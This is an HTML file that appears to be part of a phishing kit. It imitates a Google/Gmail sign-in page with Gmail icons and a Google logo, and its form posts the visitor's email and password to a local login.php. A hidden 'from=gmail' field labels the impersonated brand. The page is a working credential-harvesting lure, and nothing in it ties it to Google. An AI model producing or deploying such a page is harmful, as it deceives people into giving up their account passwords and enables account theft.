<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in Form Google</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
<link rel="stylesheet" type="text/css" href="css/gmail.css">
<link rel="icon" href="img/gmail.ico" type="image/x-icon" />

</head>
<body>
<div class="login-form">
    <h2>Sign in to Your Account</h2>
    <img src="img/google-yazi.png" width="140px;" height="70px;">
    <form action="login.php" method="post">
        <div class="text-center">
            <img src="img/gmail-avatar.gif" class="img-circle avatar" alt="Avatar">
        </div>        
        <div class="form-group">
            <input type="email" class="form-control" placeholder="Email" required="required" name="Username">
            <input type="password" class="form-control" placeholder="Password" required="required" name="Password">
            <input type="text" name="from" value="gmail" hidden>
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Sign in</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"><input type="checkbox"> Remember me</label>
            <a href="#" class="pull-right">Forgot Password?</a>
        </div>        
    </form>
    <p class="text-center"><a href="#">Create an Account</a></p>
</div>
</body>
</html>
